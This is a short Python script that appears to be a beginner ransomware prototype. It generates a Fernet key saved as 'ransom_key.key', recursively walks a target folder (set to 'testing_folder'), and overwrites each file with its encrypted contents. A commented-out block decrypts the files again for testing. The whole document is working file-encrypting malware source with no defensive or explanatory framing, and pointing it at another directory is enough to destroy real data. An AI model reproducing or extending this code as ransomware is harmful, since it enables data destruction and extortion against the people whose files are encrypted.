from cryptography.fernet import Fernet
import os

def generate_key():
    key = Fernet.generate_key()
    with open("ransom_key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("ransom_key.key", "rb").read()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)
    print(f"[+] {file_path} has been encrypted.")

def decrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path, "wb") as file:
        file.write(decrypted_data)
    print(f"[+] {file_path} has been decrypted.")


def encrypt_file_in_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def main():
    target_directory = "testing_folder"
    if not os.path.exists("ransom_key.key"):
        generate_key()
        print("[+] Encryption key generated.")

    key = load_key()
    print("[+] Key loaded, Encrypting files...")

    encrypt_file_in_directory(target_directory, key)

    # print("[+] Decrypting files for testing...")
    # for root, dirs, files in os.walk(target_directory):
    #     for file in files:
    #         file_path = os.path.join(root, file)
    #         decrypt_file(file_path, key)

if __name__ == "__main__":
    main()
